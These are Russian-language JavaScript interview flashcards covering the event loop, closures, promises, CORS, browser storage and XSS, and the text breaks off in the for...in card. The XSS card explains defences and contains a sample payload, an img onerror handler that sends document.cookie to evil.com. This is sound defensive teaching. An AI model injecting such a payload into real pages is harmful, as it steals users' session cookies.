@@@ js-01 | event-loop, async
Как работает Event Loop? В каком порядке выполнятся синхронный код, промисы и `setTimeout`?
???
JS выполняет код в одном потоке: пока работает одна функция, другая начаться не может. Чтобы при этом не зависать на таймерах и запросах, браузер держит несколько очередей:

- **стек вызовов** — код, который выполняется прямо сейчас;
- **микрозадачи** — колбэки промисов (`.then`, код после `await`), `queueMicrotask`, `MutationObserver`;
- **макрозадачи** — `setTimeout`, `setInterval`, клики и другие события, ответы сети.

Порядок одного «оборота» цикла: дождаться, пока стек опустеет → выполнить **все** микрозадачи (даже те, что добавились по ходу) → при необходимости перерисовать страницу → взять **одну** макрозадачу → снова все микрозадачи.

```js
console.log(1);
setTimeout(() => console.log(2));
Promise.resolve().then(() => console.log(3));
console.log(4);
// 1 4 3 2
```

1 и 4 — синхронный код. 3 — микрозадача, она идёт сразу после синхронного кода. 2 — макрозадача, её очередь наступает последней, даже с задержкой 0.

Следствие: бесконечная цепочка микрозадач заблокирует отрисовку так же, как бесконечный цикл.

@@@ js-02 | замыкания, функции
Что такое замыкание? Приведи практический пример.
???
Замыкание — это функция вместе с переменными из того места, где она была **создана**. Внутренняя функция сохраняет доступ к переменным внешней, даже когда внешняя уже отработала и вернула результат.

```js
function counter() {
  let n = 0;
  return () => ++n;
}
const next = counter();
next(); // 1
next(); // 2

const other = counter();
other(); // 1 — у каждого вызова counter своя n
```

Переменная `n` не исчезла после выхода из `counter`, потому что на неё ссылается возвращённая стрелка. Снаружи до `n` добраться нельзя — только через `next`.

Где применяется:

- приватное состояние без классов (счётчики, кэши);
- фабрики функций: `const add5 = makeAdder(5)`;
- `debounce` и `throttle` хранят таймер в замыкании;
- хуки React: обработчик «видит» `state` своего рендера.

Ловушка: замыкание запоминает переменную своего рендера, поэтому в `setInterval` внутри `useEffect` можно получить устаревшее значение (stale closure).

@@@ js-03 | this, функции
Как определяется `this`?
???
`this` — это объект, «от имени которого» вызвана функция. Он определяется **в момент вызова**, а не там, где функция написана. Правила по убыванию приоритета:

- `new Fn()` → новый создаваемый объект;
- `fn.call(ctx)`, `fn.apply(ctx)`, `fn.bind(ctx)` → `ctx`;
- `obj.method()` → `obj` (то, что стоит перед точкой);
- просто `fn()` → `undefined` в строгом режиме (в модулях и классах он включён всегда), иначе глобальный объект;
- стрелочная функция своего `this` не имеет и берёт его из окружения, где создана.

```js
const user = {
  name: "Аня",
  hi() { return this.name; },
};

user.hi();        // "Аня" — перед точкой user
const hi = user.hi;
hi();             // в модуле или классе: TypeError — this равен undefined
```

Метод «оторвался» от объекта, и при вызове перед ним нет точки — контекст потерян. Так же теряется `this`, когда метод передают колбэком: `setTimeout(user.hi)` или `button.onclick = user.hi`. Лечится через `user.hi.bind(user)` или стрелку `() => user.hi()`.

@@@ js-04 | переменные, tdz
Чем отличаются `var`, `let` и `const`? Что такое TDZ?
???
- **`var`** видна во всей **функции**, а не только в блоке `{}`. Её можно объявить повторно, а до строки объявления она уже существует со значением `undefined`.
- **`let`** видна только внутри **блока** (`if`, `for`, `{}`), повторное объявление — ошибка.
- **`const`** — как `let`, но переменную нельзя переприсвоить. Содержимое объекта или массива при этом менять можно: `const arr = []; arr.push(1)` работает.

**TDZ (временная мёртвая зона)** — участок от начала блока до строки с `let`/`const`. Переменная там уже «зарезервирована», но обращение к ней даёт `ReferenceError`:

```js
console.log(a); // undefined — var
var a = 1;

console.log(b); // ReferenceError — b в TDZ
let b = 2;
```

Классическая задача про циклы:

```js
for (var i = 0; i < 3; i++) setTimeout(() => console.log(i)); // 3 3 3
for (let j = 0; j < 3; j++) setTimeout(() => console.log(j)); // 0 1 2
```

С `var` переменная одна на весь цикл, и к моменту срабатывания таймеров она уже равна 3. С `let` на каждую итерацию создаётся своя копия `j`.

Правило: по умолчанию `const`, `let` — если нужно переприсваивать, `var` не использовать.

@@@ js-05 | hoisting, переменные
Что такое hoisting (всплытие)?
???
Перед выполнением кода движок проходит по нему и заранее регистрирует все объявления в области видимости. Выглядит так, будто объявления «подняли» наверх. Но поднимаются они по-разному:

- **Function Declaration** (`function hi() {}`) — целиком, вместе с телом. Её можно вызвать до строки объявления.
- **`var`** — поднимается только имя, значение до присваивания равно `undefined`.
- **`let`, `const`, `class`** — имя известно, но до строки объявления переменная в TDZ, обращение даёт `ReferenceError`.

Function Expression и стрелки — это просто значения в переменной, поэтому ведут себя как переменная:

```js
hi(); // работает: Function Declaration поднялась целиком
function hi() {}

bye(); // TypeError: bye is not a function
var bye = () => {};
// bye уже существует, но пока равна undefined — вызвать нельзя

ciao(); // ReferenceError: Cannot access 'ciao' before initialization
const ciao = () => {};
```

Обрати внимание на разные ошибки: с `var` — `TypeError` (переменная есть, но это не функция), с `const` — `ReferenceError` (обращение в TDZ). Это частый вопрос на собесе.

@@@ js-06 | сравнение, типы
Разница между `==` и `===`? Чему равно `NaN === NaN`?
???
**`===` (строгое равенство)** сравнивает и тип, и значение: если типы разные, сразу `false`.

**`==` (нестрогое)** сначала пытается привести операнды к одному типу, а правила приведения неочевидны:

```js
"1" == 1;          // true — строка стала числом
0 == "";           // true — "" превращается в 0
false == "0";      // true — оба становятся 0
null == undefined; // true — особое правило
null == 0;         // false — а это уже нет
```

Поэтому везде используют `===`. Единственное общепринятое исключение — `x == null`: короткая проверка «`x` равен `null` или `undefined`».

**`NaN === NaN` → `false`.** `NaN` («не число») — результат неудачной операции вроде `Number("abc")`, и по стандарту он не равен ничему, даже себе. Проверять так:

```js
Number.isNaN(x); // true только для NaN
Object.is(x, NaN);
```

Глобальная `isNaN("abc")` вернёт `true`, потому что сначала приводит строку к числу, — поэтому лучше `Number.isNaN`.

`Object.is` — самое строгое сравнение: оно считает `NaN` равным `NaN`, но различает `0` и `-0`. Его использует React, чтобы понять, изменился ли state.

@@@ js-07 | прототипы, ооп
Как работает прототипное наследование?
???
В JS нет классов в классическом смысле — объекты наследуют **напрямую от других объектов**. У каждого объекта есть скрытая ссылка `[[Prototype]]` на другой объект-прототип (получить её: `Object.getPrototypeOf(obj)`).

Когда ты читаешь `obj.x`, JS ищет так: в самом объекте → в его прототипе → в прототипе прототипа… и так до `null`. Это и есть **цепочка прототипов**. Если свойство не нашлось нигде — `undefined`.

```js
const animal = { eat() { return "ест"; } };
const cat = Object.create(animal); // прототип cat — animal
cat.name = "Мурка";

cat.eat();              // "ест" — найдено в прототипе
cat.hasOwnProperty("eat"); // false — у самого cat метода нет
```

Запись работает иначе: `cat.eat = …` создаст собственное свойство `cat` и не тронет `animal`.

Так устроены и встроенные типы: `[1, 2].map` берётся из `Array.prototype`, а у того прототип — `Object.prototype`, откуда приходит `toString`.

`class` — удобный синтаксис поверх того же механизма: методы класса лежат в `Class.prototype`, а `extends` связывает прототипы в цепочку.

Зачем это знать: методы хранятся один раз в прототипе, а не копируются в каждый объект, — это экономит память.

@@@ js-08 | промисы, async
Чем отличаются `Promise.all`, `allSettled`, `race` и `any`?
???
Все четыре принимают массив промисов и возвращают один общий промис. Разница — когда он завершится и с каким результатом:

- **`all`** — ждёт, пока **все** выполнятся, и отдаёт массив результатов в том же порядке. Если хоть один упал — сразу ошибка (остальные результаты теряются).
- **`allSettled`** — ждёт **все** и никогда не падает. Возвращает отчёт по каждому: `{ status: "fulfilled", value }` или `{ status: "rejected", reason }`.
- **`race`** — берёт результат **первого завершившегося**, неважно, успех это или ошибка.
- **`any`** — берёт первый **успешный**. Падает, только если упали все, — с `AggregateError`.

```js
const [user, posts] = await Promise.all([getUser(), getPosts()]);

const results = await Promise.allSettled(urls.map((u) => fetch(u)));
const ok = results.filter((r) => r.status === "fulfilled");
```

Когда что:

- `all` — данные нужны все сразу (профиль + посты для страницы);
- `allSettled` — устраивает частичный успех (загрузить 10 файлов и показать, какие не загрузились);
- `race` — таймаут: гонка запроса с таймером;
- `any` — самый быстрый из нескольких зеркал или CDN.

Важно: ни один из методов не отменяет «проигравшие» промисы — они продолжают выполняться.

@@@ js-09 | async, промисы
Как обрабатывать ошибки в async/await? Что будет, если забыть `await`?
???
`async`-функция всегда возвращает промис. Ошибка внутри неё — это отклонённый промис, и поймать его можно двумя способами:

```js
try {
  const user = await getUser();
} catch (e) {
  showError(e);
}

const user = await getUser().catch(() => null); // запасное значение
```

**Если забыть `await`:**

```js
try {
  getUser(); // промис создан, но мы его не ждём
} catch (e) {
  // сюда ошибка не попадёт никогда
}
```

`try/catch` ловит только то, что упало синхронно или в `await`. Без `await` функция сразу пойдёт дальше, ошибка случится позже, когда `try` уже закончился, и превратится в unhandled rejection (в Node это может уронить процесс). Ещё одна частая ошибка: `if (isValid())` без `await` — промис всегда truthy, условие всегда выполнится.

**Последовательно или параллельно:**

```js
// медленно: второй запрос стартует после первого (1 с + 1 с = 2 с)
const a = await getA();
const b = await getB();

// быстро: оба стартуют сразу (≈1 с)
const [a2, b2] = await Promise.all([getA(), getB()]);
```

Последовательно делают только тогда, когда второму запросу нужен результат первого.

@@@ js-10 | debounce, задачи
Чем debounce отличается от throttle? Напиши debounce.
???
Оба ограничивают, как часто вызывается функция при частых событиях, но по-разному:

- **debounce** («подождать тишины») — вызов происходит **один раз**, когда события прекратились на N мс. Пока пользователь печатает, таймер сбрасывается снова и снова. Пример: поиск при вводе — запрос уйдёт, когда человек перестанет печатать.
- **throttle** («не чаще чем») — вызов происходит **не чаще раза в N мс**, пока события идут. Пример: обработка `scroll` или `resize`, отправка координат мыши.

Если печатать 3 секунды без пауз с интервалом 300 мс: debounce вызовется 1 раз в конце, throttle — около 10 раз.

```ts
function debounce<A extends unknown[]>(fn: (...args: A) => void, ms: number) {
  let timer: ReturnType<typeof setTimeout>;
  return (...args: A) => {
    clearTimeout(timer);                       // отменить предыдущий запланированный вызов
    timer = setTimeout(() => fn(...args), ms); // и запланировать новый
  };
}

const search = debounce((q: string) => fetchResults(q), 300);
input.addEventListener("input", (e) => search(e.target.value));
```

`timer` живёт в замыкании, поэтому каждый вызов `search` видит предыдущий таймер. `ReturnType<typeof setTimeout>` — тип, который подходит и для браузера (число), и для Node (объект).

В React debounce-функцию нужно создавать один раз (не на каждый рендер), иначе таймер будет каждый раз новый.

@@@ js-11 | this, функции
`call`, `apply`, `bind` — в чём разница?
???
Все три позволяют явно указать, чему будет равен `this` внутри функции. Разница в том, **когда** функция выполнится и **как** передаются аргументы:

- `fn.call(ctx, a, b)` — вызывает **сразу**, аргументы через запятую;
- `fn.apply(ctx, [a, b])` — вызывает **сразу**, аргументы массивом;
- `fn.bind(ctx, a)` — **не вызывает**, а возвращает новую функцию с навсегда привязанным `this` (и, при желании, частью аргументов).

```js
function greet(greeting, mark) {
  return `${greeting}, ${this.name}${mark}`;
}
const user = { name: "Аня" };

greet.call(user, "Привет", "!");    // "Привет, Аня!"
greet.apply(user, ["Привет", "!"]); // "Привет, Аня!"

const hiAnya = greet.bind(user, "Привет");
hiAnya("?");                        // "Привет, Аня?"
```

Запомнить: **A**pply — **A**rray, **b**ind — «привязать на потом».

Где нужно на практике: `bind` — чтобы передать метод колбэком и не потерять `this` (`setTimeout(obj.method.bind(obj))`). `apply` раньше использовали для `Math.max.apply(null, arr)`, сейчас вместо этого spread: `Math.max(...arr)`.

Нюансы: повторный `bind` уже привязанной функции контекст не меняет; на стрелочные функции все три не влияют — у стрелок нет своего `this`.

@@@ js-12 | объекты, копирование
Поверхностное и глубокое копирование. Как скопировать объект глубоко?
???
Объекты в JS хранятся по ссылке: `const b = a` не создаёт копию — `a` и `b` указывают на один объект.

**Поверхностная копия** создаёт новый объект, но вложенные объекты в нём остаются **общими** с оригиналом:

```js
const user = { name: "Аня", address: { city: "Москва" } };
const copy = { ...user }; // или Object.assign({}, user)

copy.name = "Боб";             // оригинал не изменился
copy.address.city = "Казань";  // а здесь изменился и user.address!
```

**Глубокая копия** — копируется всё дерево целиком. Современный способ:

```js
const deep = structuredClone(user);
deep.address.city = "Казань"; // user не затронут
```

`structuredClone` встроен в браузеры и Node 17+. Поддерживает `Date`, `Map`, `Set`, `RegExp` и даже циклические ссылки. Не умеет копировать функции, DOM-узлы и экземпляры классов (они станут обычными объектами без методов).

Старый способ `JSON.parse(JSON.stringify(obj))` хуже: теряет `undefined` и функции, `Date` превращает в строку, `Map` — в `{}`, а на циклических ссылках падает.

В React и Redux глубокое копирование обычно не нужно: копируют только ту ветку, которую меняют (`{ ...user, address: { ...user.address, city } }`) — остальное переиспользуется.

@@@ js-13 | коллекции
`Map` против `Object`, `Set`, `WeakMap` — когда что?
???
- **`Object`** — для «записей» с заранее известными полями: `{ id, name, email }`. Ключи только строки и символы.
- **`Map`** — словарь «ключ → значение», когда ключи заранее неизвестны или часто добавляются и удаляются. Ключом может быть что угодно, даже объект или функция. Сохраняет порядок вставки, есть `size`, удобно перебирать.
- **`Set`** — набор **уникальных** значений. Быстрая проверка `has` и удаление дублей: `[...new Set(arr)]`.
- **`WeakMap` / `WeakSet`** — ключи только объекты, и связь «слабая»: если на объект больше нигде нет ссылок, сборщик мусора удалит его вместе с записью.

```js
const visits = new Map();
visits.set(userObj, 3);         // объект как ключ — в Object так нельзя
visits.get(userObj);            // 3

const meta = new WeakMap();
meta.set(domNode, { clicks: 0 }); // удалили узел — запись исчезнет сама
```

Почему не `Object` для словаря: у обычного объекта есть прототип, и ключ вроде `"constructor"` или `"__proto__"` может вести себя неожиданно. Ключи-числа превращаются в строки (`obj[1]` и `obj["1"]` — одно и то же).

`WeakMap` нельзя перебрать и узнать размер — в любой момент сборщик может удалить запись. Он нужен для кэшей и метаданных к чужим объектам без утечек памяти.

@@@ js-14 | dom, события
Что такое всплытие и делегирование событий?
???
Когда ты кликаешь по кнопке внутри списка, событие получает не только кнопка. Оно проходит путь в три фазы:

1. **Погружение (capturing)** — от `window` вниз до элемента, по которому кликнули;
2. **Цель** — сам элемент;
3. **Всплытие (bubbling)** — обратно вверх через всех родителей до `window`.

Обработчики по умолчанию срабатывают на фазе всплытия, поэтому клик по `<li>` «услышит» и `<ul>`, и `body`.

**Делегирование** использует всплытие: вместо обработчика на каждом элементе вешают **один** на общего родителя и смотрят, где именно кликнули:

```js
list.addEventListener("click", (e) => {
  const item = e.target.closest("li"); // ближайший li от места клика вверх
  if (item) select(item.dataset.id);
});
```

Плюсы: один обработчик вместо тысячи, и он работает для элементов, добавленных позже (не нужно навешивать заново).

- `e.target` — самый глубокий элемент, по которому кликнули (может быть иконка внутри `li`, поэтому нужен `closest`);
- `e.currentTarget` — элемент, на котором висит обработчик (здесь `list`).

`e.stopPropagation()` останавливает всплытие, но им стоит пользоваться осторожно — сломает делегирование выше по дереву. React сам использует делегирование: вешает обработчики на корень приложения.

@@@ js-15 | массивы, иммутабельность
Какие методы массива мутируют исходный массив? Какие есть иммутабельные аналоги?
???
**Мутируют** (меняют сам массив): `push`, `pop`, `shift`, `unshift`, `splice`, `sort`, `reverse`, `fill`, `copyWithin`.

**Не мутируют** (возвращают новый массив): `map`, `filter`, `slice`, `concat`, `flat`, `flatMap`.

В ES2023 появились копирующие версии мутирующих методов:

| Мутирует | Возвращает копию |
| --- | --- |
| `sort()` | `toSorted()` |
| `reverse()` | `toReversed()` |
| `splice()` | `toSpliced()` |
| `arr[i] = v` | `arr.with(i, v)` |

```js
const nums = [3, 1, 2];
const sorted = nums.toSorted((a, b) => a - b); // [1, 2, 3]
nums; // [3, 1, 2] — исходный не тронут
```

Почему это важно: React и Redux понимают, что данные изменились, **по смене ссылки**. `items.sort()` меняет массив на месте, ссылка та же — компонент может не перерисоваться. Поэтому в стейте используют копирующие методы или spread: `[...items, newItem]`.

Ловушка: `sort()` без аргумента сравнивает элементы **как строки**:

```js
[10, 9, 1].sort(); // [1, 10, 9] — "10" < "9" по алфавиту
[10, 9, 1].sort((a, b) => a - b); // [1, 9, 10]
```

Компаратор возвращает отрицательное число, если `a` должен идти раньше `b`, положительное — если позже.

@@@ js-16 | типы
Какие типы данных есть в JS? Что вернёт `typeof null`?
???
В JS 8 типов: 7 **примитивов** и `object`.

Примитивы: `string`, `number`, `bigint`, `boolean`, `undefined`, `symbol`, `null`. Всё остальное — объекты: массивы, функции, даты, `Map`, регулярные выражения.

Главное различие:

- примитивы **неизменяемые** и копируются **по значению**: `let b = a` создаёт независимую копию;
- объекты передаются **по ссылке**: `let b = a` — это два имени для одного объекта, изменение через `b` видно через `a`.

```js
let s = "hi";
s[0] = "H"; // ничего не произойдёт — строку нельзя изменить
s;          // "hi"
```

**`typeof null === "object"`** — ошибка из первой версии языка, которую не исправили ради совместимости. `null` — примитив. Проверять так: `x === null`.

Другие особенности `typeof`:

```js
typeof function () {}; // "function" — хотя функция это объект
typeof [];             // "object" — массив тоже
typeof NaN;            // "number"
typeof undeclaredVar;  // "undefined" — без ошибки
```

Массив проверяют через `Array.isArray(x)`, а «настоящий» объект — `x !== null && typeof x === "object"`.

@@@ js-17 | модули
Чем ES-модули отличаются от CommonJS?
???
Это две системы модулей: **ESM** — стандарт языка, **CommonJS** — исторический формат Node.js.

**ESM** (`import` / `export`):

- **статические** — импорты пишутся на верхнем уровне, и бандлер видит все зависимости ещё до запуска кода. Благодаря этому работает **tree-shaking**: неиспользуемый код выбрасывается из сборки;
- экспорт — **живая привязка**: если модуль поменяет экспортированную переменную, импортирующий увидит новое значение;
- загружаются асинхронно, поддерживают top-level `await`;
- всегда в строгом режиме.

**CommonJS** (`require` / `module.exports`):

- `require` — обычная функция, её можно вызвать где угодно, хоть в `if`. Поэтому бандлер не знает заранее, что понадобится, и tree-shaking работает плохо;
- загрузка синхронная;
- импортируется значение на момент вызова — дальнейшие изменения в модуле не видны.

```js
// ESM
import { sum } from "./math.js";
export const total = sum(1, 2);

// CommonJS
const { sum } = require("./math");
module.exports = { total: sum(1, 2) };
```

Для динамической загрузки в ESM есть `import("./module.js")` — возвращает промис. На нём построены ленивые компоненты (`React.lazy`) и разбиение кода. Сегодня стандарт и в браузере, и в Node — ESM.

@@@ js-18 | операторы
Что делают `?.` и `??`? Чем `??` отличается от `||`?
???
**`?.` (optional chaining)** — безопасный доступ к свойству. Если слева `null` или `undefined`, вся цепочка сразу возвращает `undefined` вместо ошибки `Cannot read properties of undefined`:

```js
user?.address?.city; // undefined, если нет user или address
user.getName?.();    // вызвать, только если метод существует
list?.[0];           // безопасный доступ по индексу
```

**`??` (nullish coalescing)** — значение по умолчанию, но **только** для `null` и `undefined`. А `||` подставляет его для **любого** falsy-значения: `0`, `""`, `false`, `NaN`:

```js
const count = 0;
count || 10; // 10 — ноль потерялся, а он мог быть правильным значением
count ?? 10; // 0

const name = "";
name || "Гость"; // "Гость"
name ?? "Гость"; // ""
```

Правило: если `0`, `""` или `false` — допустимые значения, используй `??`.

Ещё есть присваивание: `settings.volume ??= 50` запишет 50, только если там `null` или `undefined`. Аналогично работают `||=` и `&&=`.

Ловушки:

- `?.` не стоит ставить везде «на всякий случай» — он прячет ошибки там, где значение обязано быть, и баг вылезет позже и в другом месте;
- `a ?? b || c` без скобок — синтаксическая ошибка, нужно явно: `(a ?? b) || c`.

@@@ js-19 | память
Как работает сборщик мусора и откуда берутся утечки памяти?
???
В JS память освобождается автоматически. Сборщик мусора периодически запускает алгоритм **mark-and-sweep** («пометить и вымести»):

1. начинает с **корней** — глобальных переменных и того, что сейчас в стеке вызовов;
2. помечает всё, до чего можно дойти по ссылкам из корней;
3. удаляет всё непомеченное.

Важное слово — **достижимость**. Объект удаляется не тогда, когда он «больше не нужен», а когда на него нет ссылок. **Утечка** — это объект, который уже не нужен, но на него случайно осталась ссылка:

- **забытые таймеры и подписки**: `setInterval` или `addEventListener` держат колбэк, а колбэк через замыкание — всё, что в нём используется;
- **растущие кэши**: `Map`, в который только добавляют;
- **отсоединённые DOM-узлы**: элемент удалили со страницы, но ссылка на него осталась в переменной;
- **замыкания** на большие данные, которые живут дольше, чем нужно.

```js
useEffect(() => {
  const onResize = () => setWidth(window.innerWidth);
  window.addEventListener("resize", onResize);
  return () => window.removeEventListener("resize", onResize); // без этого — утечка
}, []);
```

В React утечки чаще всего — эффекты без функции очистки (cleanup).

Как искать: DevTools → Memory → сделать два снимка кучи (heap snapshot) до и после действия и сравнить, какие объекты не освободились.

@@@ js-20 | браузер, производительность
Что происходит, когда браузер рисует страницу (critical rendering path)?
???
Путь от кода до пикселей на экране:

1. HTML разбирается в **DOM** — дерево элементов;
2. CSS разбирается в **CSSOM** — дерево стилей;
3. из них строится **Render Tree** — только видимые элементы с вычисленными стилями (`display: none` сюда не попадает);
4. **Layout** (reflow) — расчёт геометрии: где каждый элемент и какого размера;
5. **Paint** — заливка пикселей: цвета, текст, тени;
6. **Composite** — сборка готовых слоёв в итоговую картинку, часто на видеокарте.

Почему это важно: при изменении стиля браузер повторяет шаги **с того места, которое затронуто**:

- `width`, `height`, `top`, `margin`, размер шрифта → layout + paint + composite — самое дорогое, может пересчитываться вся страница;
- `color`, `background`, `box-shadow` → paint + composite;
- `transform`, `opacity` → только composite.

Поэтому анимации делают через `transform` и `opacity`: так держатся стабильные 60 кадров в секунду.

**Layout thrashing** — чередование записи и чтения геометрии в цикле:

```js
items.forEach((el) => {
  el.style.width = box.offsetWidth + "px"; // чтение после записи → принудительный layout на каждой итерации
});
```

Решение: сначала прочитать все значения, потом всё записать.

@@@ js-21 | сеть, async
Как отменить fetch-запрос?
???
Через `AbortController`. Это пара «пульт + сигнал»: сигнал отдаём в `fetch`, а пульт оставляем себе.

```ts
const controller = new AbortController();

fetch(url, { signal: controller.signal })
  .then((res) => res.json())
  .catch((e) => {
    if (e.name === "AbortError") return; // отменили сами — это не ошибка
    throw e;
  });

controller.abort(); // запрос прервётся, промис отклонится с AbortError
```

Зачем отменять:

- **гонки запросов** — пользователь быстро переключает вкладки, и ответ на старый запрос приходит позже нового и перетирает данные;
- **уход со страницы** — ответ уже никому не нужен;
- **поиск при вводе** — старые запросы не нужны, важен только последний.

В React отменяют в функции очистки эффекта:

```ts
useEffect(() => {
  const controller = new AbortController();
  fetch(`/api/users/${id}`, { signal: controller.signal })
    .then((r) => r.json())
    .then(setUser)
    .catch(() => {});
  return () => controller.abort(); // сменился id или компонент удалён
}, [id]);
```

Для таймаута есть готовый сигнал: `fetch(url, { signal: AbortSignal.timeout(5000) })`. Один контроллер можно передать в несколько запросов и отменить их все разом.

@@@ js-22 | сеть, безопасность
Что такое CORS и почему возникает ошибка?
???
**Origin** — это протокол + домен + порт. `https://site.com` и `https://api.site.com` — разные origin, как и `localhost:3000` и `localhost:8080`.

По умолчанию браузер действует по **same-origin policy**: JS на странице может отправить запрос на другой origin, но **не получит ответ**, если сервер явно этого не разрешил. Это защищает пользователя: чужой сайт не сможет прочитать данные из вашего банка, даже если у вас там открыта сессия.

**CORS** (Cross-Origin Resource Sharing) — способ серверу сказать «этому origin можно»:

```
Access-Control-Allow-Origin: https://my-app.com
Access-Control-Allow-Credentials: true
```

Для «непростых» запросов (методы `PUT`, `DELETE`, тело `application/json`, свои заголовки вроде `Authorization`) браузер сначала отправляет **preflight** — запрос `OPTIONS` с вопросом «можно ли?». Если сервер не ответил нужными заголовками, основной запрос не уйдёт.

Почему ошибка чинится **на сервере**, а не на клиенте: разрешение выдаёт сервер. Варианты:

- настроить заголовки CORS на бэкенде;
- в разработке — прокси через dev-сервер (`rewrites` в Next.js), тогда запрос идёт на свой origin.

CORS — механизм только браузера. Запрос из curl, Postman или с сервера на сервер его не касается, поэтому «в Postman работает, а в браузере нет» — типичный признак CORS.

@@@ js-23 | браузер, хранилища
`cookie`, `localStorage`, `sessionStorage`, IndexedDB — в чём разница?
???
| | Объём | Срок жизни | Уходит на сервер | API |
| --- | --- | --- | --- | --- |
| cookie | ~4 КБ | задаётся (`Max-Age`) | с каждым запросом | строка |
| localStorage | ~5 МБ | бессрочно | нет | синхронный, строки |
| sessionStorage | ~5 МБ | до закрытия вкладки | нет | синхронный, строки |
| IndexedDB | сотни МБ и больше | бессрочно | нет | асинхронный, объекты |

**Cookie** — единственное хранилище, которое браузер сам отправляет на сервер. Поэтому в ней хранят сессию. С флагом `HttpOnly` cookie недоступна из JS — её не украдёт XSS-скрипт.

**localStorage** — простое хранилище «ключ → строка» для настроек: тема, язык, черновик. Объекты нужно сериализовать: `localStorage.setItem("prefs", JSON.stringify(prefs))`. Минус — синхронный API: чтение большого значения блокирует главный поток.

**sessionStorage** — то же самое, но данные свои у каждой вкладки и исчезают при её закрытии. Подходит для состояния многошаговой формы.

**IndexedDB** — настоящая база данных в браузере: хранит объекты, `Blob`, поддерживает индексы и транзакции, не блокирует интерфейс. Нужна для офлайн-приложений и больших данных. Сырой API неудобный, поэтому используют обёртки вроде `idb-keyval` или Dexie.

Все хранилища, кроме cookie, привязаны к origin: другой сайт их не прочитает. Это приложение хранит карточки в IndexedDB.

@@@ js-24 | иммутабельность, функции
Что такое чистая функция и иммутабельность? Почему это важно в React?
???
**Чистая функция** выполняет два условия:

1. при одних и тех же аргументах всегда возвращает один и тот же результат;
2. не имеет побочных эффектов: не меняет внешние переменные и аргументы, не делает запросов, не пишет в DOM.

```js
const add = (a, b) => a + b;            // чистая
const addItem = (list, x) => { list.push(x); return list; }; // нечистая: меняет аргумент
```

**Иммутабельность** — данные не изменяют, а создают новые с нужными изменениями.

Почему это важно в React: чтобы понять, нужно ли перерисоваться, React сравнивает старое и новое значение **по ссылке** (`Object.is`), а не перебирает содержимое. Мутация меняет содержимое, но ссылка остаётся той же:

```js
setItems([...items, x]);         // ✓ новый массив → React видит изменение
items.push(x); setItems(items);  // ✗ та же ссылка → ререндера не будет

setUser({ ...user, name: "Боб" });        // ✓
user.name = "Боб"; setUser(user);         // ✗
```

От компонентов React тоже ждёт чистоты: при одних пропсах и стейте — одинаковый JSX. Поэтому запросы и подписки выносят в обработчики событий и `useEffect`. `StrictMode` в разработке специально вызывает компоненты дважды, чтобы такие нарушения проявились.

Бонус чистых функций: их легко тестировать, кэшировать (`useMemo`) и переиспользовать.

@@@ js-25 | безопасность
Что такое XSS и как от него защититься?
???
**XSS (Cross-Site Scripting)** — атака, при которой злоумышленник внедряет свой JS-код на страницу через пользовательские данные: комментарий, имя профиля, параметр URL. Этот код выполняется в браузере других пользователей с правами вашего сайта: читает их данные, отправляет запросы от их имени.

```js
const comment = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';
div.innerHTML = comment; // скрипт выполнится у каждого, кто откроет страницу
```

**Что делает React:** всё, что выводится в JSX через `{}`, автоматически экранируется — `<` превращается в `&lt;`, и строка показывается как текст, а не как HTML. Поэтому `<p>{comment}</p>` безопасен.

**Где React не защищает:**

- `dangerouslySetInnerHTML={{ __html: html }}`;
- ссылки с `href={userUrl}` — в React до 19-й версии значение `javascript:alert(1)` выполнялось по клику (React 19 такие адреса блокирует, но в обычном DOM это по-прежнему опасно);
- прямая работа с DOM: `innerHTML`, `insertAdjacentHTML`, `eval`, `new Function`.

**Защита:**

- не вставлять сырой HTML, а если очень нужно — чистить через DOMPurify;
- проверять, что ссылки начинаются с `http:` или `https:`;
- настроить **Content-Security-Policy** — браузер не выполнит скрипты из чужих источников;
- хранить токен в `HttpOnly` cookie, а не в `localStorage`, чтобы скрипт не смог его унести;
- экранировать данные и на сервере, при генерации HTML.

@@@ js-26 | итераторы, генераторы
Что такое итераторы и генераторы?
???
**Итератор** — объект, который выдаёт значения по одному. У него есть метод `next()`, который при каждом вызове возвращает `{ value, done }`: очередное значение и признак, закончились ли данные.

Объект называется **итерируемым**, если у него есть метод `[Symbol.iterator]`, возвращающий итератор. Тогда с ним работают `for...of`, spread `[...x]`, деструктуризация и `Array.from`. Встроенные итерируемые: массивы, строки, `Map`, `Set`.

**Генератор** (`function*`) — самый простой способ создать итератор. Это функция, которая умеет **приостанавливаться** на `yield`, отдавать значение и потом продолжать с того же места при следующем `next()`.

```js
function* ids() {
  let id = 1;
  while (true) yield id++; // бесконечная, но ленивая последовательность
}
const gen = ids();
gen.next().value; // 1
gen.next().value; // 2

const range = {
  from: 1,
  to: 3,
  *[Symbol.iterator]() {
    for (let i = this.from; i <= this.to; i++) yield i;
  },
};
[...range]; // [1, 2, 3]
```

Бесконечный `while (true)` не зависает: генератор вычисляет следующее значение, только когда его попросят. Это и есть **ленивость**.

Где пригодится: ленивая обработка больших или бесконечных последовательностей, постраничная загрузка (`async function*` + `for await`), обход деревьев. На генераторах построена библиотека redux-saga.

@@@ js-27 | proxy, метапрограммирование
Что такое `Proxy` и где он применяется?
???
`Proxy` — обёртка над объектом, которая перехватывает операции с ним: чтение свойства, запись, удаление, проверку `in`, вызов функции. Перехватчики называются **ловушками** (traps). А `Reflect` — набор методов, которые выполняют ту же операцию «как обычно», чтобы не писать это вручную.

```js
const user = { name: "Ann", age: 30 };
const watched = new Proxy(user, {
  get(target, key) {
    return key in target ? target[key] : `нет поля ${String(key)}`;
  },
  set(target, key, value) {
    console.log(`${String(key)}: ${target[key]} → ${value}`);
    return Reflect.set(target, key, value);
  },
});

watched.age = 31; // "age: 30 → 31"
watched.email;    // "нет поля email"
```

Ловушка `set` должна вернуть `true`, иначе в строгом режиме будет `TypeError`. `Reflect.set` как раз возвращает нужный результат.

Где применяется:

- **реактивность**: Vue 3 и MobX узнают, какие поля прочитал компонент и какие изменились, чтобы перерисовать только нужное;
- **Immer** (внутри Redux Toolkit) — даёт писать `state.todos.push(x)` в черновик, а сам собирает новый неизменяемый объект;
- валидация при записи, логирование, значения по умолчанию, защита от опечаток в именах полей.

Минус — Proxy работает медленнее обычного объекта, поэтому в горячем коде его не используют.

@@@ js-28 | циклы, ловушка
Чем `for...in` отличается от `for...of`?
???
- **`for...in`** перебирает **ключи** (имена свойств, всегда строки) любого объекта. В перебор попадают и **унаследованные** перечисляемые свойства из прототипа.
